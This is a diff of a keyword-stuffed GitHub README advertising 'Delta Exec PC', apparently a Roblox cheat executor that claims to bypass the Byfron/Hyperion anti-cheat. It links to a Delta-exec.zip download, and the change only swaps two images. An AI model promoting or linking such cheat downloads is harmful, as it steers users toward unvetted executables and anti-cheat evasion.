@@ -1,7 +1,7 @@
 # Delta Exec PC
 Delta Exec PC — delta exec pc delta  roblox pc exploit lua script byfron hyperion bypass keyless fluxus arceus x codex blox fruits pet simulator hub auto farm windows 11 2026
 
-<img width="576" height="420" alt="image" src="https://github.com/user-attachments/assets/972ffa92-3abb-44f8-8cee-99c7359ce31f" />
+<img width="365" height="138" alt="image" src="https://github.com/user-attachments/assets/c8ff5234-f456-408a-8088-6065557d44c0" />
 
 [![GitHub Stars](https://img.shields.io/github/stars/ZcythierO/Delta-Exec-PC?style=flat-square&color=00d4aa)](https://github.com/ZcythierO/Delta-Exec-PC/stargazers)
 [![GitHub Forks](https://img.shields.io/github/forks/ZcythierO/Delta-Exec-PC?style=flat-square&color=0099cc)](https://github.com/ZcythierO/Delta-Exec-PC/network)
@@ -18,7 +18,8 @@ Delta Exec PC is a powerful and stable Roblox Lua script for Windows. It feature
 [Download `Delta-exec.zip`](https://github.com/ZcythierO/Delta-Exec-PC/releases/download/roblox/Delta-exec.zip)
 ---
 > Optimized for Windows 11.
-<img width="365" height="138" alt="image" src="https://github.com/user-attachments/assets/c8ff5234-f456-408a-8088-6065557d44c0" />
+
+<img width="576" height="420" alt="image" src="https://github.com/user-attachments/assets/972ffa92-3abb-44f8-8cee-99c7359ce31f" />
 
 ## Installation
 ### For Regular Users
